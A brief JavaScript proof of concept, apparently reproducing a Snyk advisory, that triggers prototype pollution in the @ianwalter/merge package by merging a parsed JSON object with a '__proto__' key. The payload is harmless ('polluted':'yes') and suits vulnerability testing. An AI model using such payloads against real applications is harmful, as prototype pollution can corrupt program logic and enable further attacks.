//https://security.snyk.io/vuln/SNYK-JS-IANWALTERMERGE-1311022
 
  const merge = require("@ianwalter/merge");

   

  let EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  merge({}, EVIL_JSON);
// End of file
